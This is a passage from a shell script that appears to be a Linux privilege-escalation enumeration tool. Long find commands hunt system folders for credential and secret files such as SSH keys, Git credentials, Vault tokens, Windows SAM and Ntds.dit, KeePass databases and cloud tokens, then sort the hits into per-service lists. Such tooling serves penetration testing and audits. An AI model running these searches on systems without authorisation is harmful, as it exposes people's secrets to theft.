\"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"webserver_config.py\" -o -name \"AzureRMContext.json\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1171	  FIND_USR=`eval_bckgrd "find ${ROOT_FOLDER}usr -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"ssh*config\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"webserver_config.py\" -o -name \"AzureRMContext.json\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1172	  FIND_VAR=`eval_bckgrd "find ${ROOT_FOLDER}var -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"sess_*\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"webserver_config.py\" -o -name \"AzureRMContext.json\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1173	  FIND_CONCOURSE_AUTH=`eval_bckgrd "find ${ROOT_FOLDER}concourse-auth -name \"*.socket\" -o -name \"*.timer\" -o -name \"*.service\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1174	  FIND_CONCOURSE_KEYS=`eval_bckgrd "find ${ROOT_FOLDER}concourse-keys -name \"*.socket\" -o -name \"*.timer\" -o -name \"*.service\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1175	
  1176	
  1177	  wait # Always wait at the end
  1178	  CONT_THREADS=0 #Reset the threads counter
  1179	fi 
  1180	
  1181	if [ "$SEARCH_IN_FOLDER" ] || echo $CHECKS | grep -q procs_crons_timers_srvcs_sockets || echo $CHECKS | grep -q software_information || echo $CHECKS | grep -q interesting_files; then
  1182	  #GENERATE THE STORAGES OF THE FOUND FILES
  1183	  PSTORAGE_SYSTEMD=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}concourse-keys|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}media|^${ROOT_FOLDER}concourse-auth|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}system|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}lib64|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}lib32|^${ROOT_FOLDER}run|^${ROOT_FOLDER}sys|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}lib|^${ROOT_FOLDER}systemd|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.service$" | sort | uniq | head -n 70)
  1184	  PSTORAGE_TIMER=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}concourse-keys|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}media|^${ROOT_FOLDER}concourse-auth|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}system|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}lib64|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}lib32|^${ROOT_FOLDER}run|^${ROOT_FOLDER}sys|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}lib|^${ROOT_FOLDER}systemd|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.timer$" | sort | uniq | head -n 70)
  1185	  PSTORAGE_SOCKET=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}concourse-keys|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}media|^${ROOT_FOLDER}concourse-auth|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}system|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}lib64|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}lib32|^${ROOT_FOLDER}run|^${ROOT_FOLDER}sys|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}lib|^${ROOT_FOLDER}systemd|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.socket$" | sort | uniq | head -n 70)
  1186	  PSTORAGE_DBUS=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc" | grep -E "system\.d$" | sort | uniq | head -n 70)
  1187	  PSTORAGE_MYSQL=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E 'mysql/mysql' | grep -E '^/etc/.*mysql|/usr/var/lib/.*mysql|/var/lib/.*mysql' | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "mysql$|passwd\.ibd$|password.*\.ibd$|pwd\.ibd$|mysqld\.cnf$" | sort | uniq | head -n 70)
  1188	  PSTORAGE_MARIADB=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "mariadb\.cnf$|debian\.cnf$" | sort | uniq | head -n 70)
  1189	  PSTORAGE_POSTGRESQL=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "pgadmin.*\.db$|pg_hba\.conf$|postgresql\.conf$|pgsql\.conf$|pgadmin4\.db$" | sort | uniq | head -n 70)
